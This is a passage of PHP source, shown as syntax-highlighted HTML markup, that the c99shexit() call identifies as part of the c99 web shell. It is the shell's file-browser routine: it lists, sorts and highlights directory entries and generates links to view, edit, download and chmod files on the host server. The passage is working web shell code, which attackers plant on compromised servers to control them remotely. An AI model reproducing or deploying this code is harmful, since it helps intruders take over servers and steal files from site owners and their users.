    <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
   <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
   <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
   <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]);</span>
    <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
   <span class="p">}</span>
   <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
   <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;cols&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
   <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$a</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="nv">$o</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_fullpath</span><span class="p">)</span> <span class="p">{</span><span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$o</span><span class="p">;}</span>
    <span class="nv">$disppath</span> <span class="o">=</span> <span class="nx">str2mini</span><span class="p">(</span><span class="nv">$disppath</span><span class="p">,</span><span class="mi">60</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$disppath</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;strike&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/strike&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$disppath</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;u&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$regxp_highlight</span> <span class="k">as</span> <span class="nv">$r</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$o</span><span class="p">))</span>
     <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">3</span><span class="p">))</span> <span class="p">{</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="s2">&quot;Warning! Configuration error in </span><span class="se">\$</span><span class="s2">regxp_highlight[&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;][0] - unknown command.&quot;</span><span class="p">;</span> <span class="nx">c99shexit</span><span class="p">();}</span>
      <span class="k">else</span>
      <span class="p">{</span>
       <span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
       <span class="nv">$isdir</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
       <span class="k">if</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">or</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$isdir</span><span class="p">)</span> <span class="k">or</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$isdir</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$r</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="nv">$r</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="p">{</span><span class="k">break</span><span class="p">;}</span>
       <span class="p">}</span>
      <span class="p">}</span>
     <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$uo</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
    <span class="nv">$ud</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
    <span class="nv">$uv</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="nv">$row</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;LINK&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;LINK&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span>
     <span class="p">{</span>
      <span class="nv">$disppath</span> <span class="o">.=</span> <span class="s2">&quot; =&amp;gt; &quot;</span><span class="o">.</span><span class="nb">readlink</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
      <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;LINK&quot;</span><span class="p">;</span>
      <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;]&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>         <span class="p">}</span>
     <span class="k">else</span>
     <span class="p">{</span>
      <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;DIR&quot;</span><span class="p">;</span>
      <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;]&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
     <span class="p">}</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
     <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
     <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
     <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="mi">3</span><span class="p">];}</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;chmod&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$checkbox</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actbox[]</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">ls_reverse_all();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">--</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="nv">$checkbox</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actbox[]</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">actbox&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">)){</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;d&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;I&amp;lt;/a&amp;gt;&amp;nbsp;&quot;</span><span class="o">.</span><span class="nv">$checkbox</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;I&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;edit&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;E&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;download&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;D&amp;lt;/a&amp;gt;&amp;nbsp;&quot;</span><span class="o">.</span><span class="nv">$checkbox</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">//Compiling table</span>
  <span class="nv">$table</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;cols&quot;</span><span class="p">],</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">],</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Listing folder (&quot;</span><span class="o">.</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">])</span><span class="o">+</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot; folders):&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&amp;lt;TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0&amp;gt;&amp;lt;form method=POST name=</span><span class="se">\&quot;</span><span class="s2">ls_form</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;lt;input type=hidden name=d value=&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$table</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
   <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;p align=</span><span class="se">\&quot;</span><span class="s2">right</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">  &amp;lt;script&amp;gt;</span>
<span class="s2">  function ls_setcheckboxall(status)</span>
<span class="s2">  {</span>
<span class="s2">   var id = 0;</span>
<span class="s2">   var num = &quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$table</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;</span>
<span class="s2">   while (id &amp;lt;= num)</span>
<span class="s2">   {</span>
<span class="s2">    document.getElementById(&#39;actbox&#39;+id).checked = status;</span>
<span class="s2">    id++;</span>
<span class="s2">   }</span>
<span class="s2">  }</span>
<span class="s2">  function ls_reverse_all()</span>
<span class="s2">  {</span>
<span class="s2">   var id = 0;</span>
<span class="s2">   var num = &quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$table</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;</span>
<span class="s2">   while (id &amp;lt;= num)</span>
<span class="s2">   {</span>
<span class="s2">    document.getElementById(&#39;actbox&#39;+id).checked = !document.getElementById(&#39;actbox&#39;+id).checked;</span>
<span class="s2">    id++;</span>
<span class="s2">   }</span>
<span class="s2">  }</span>
<span class="s2">  &amp;lt;/script&amp;gt;</span>
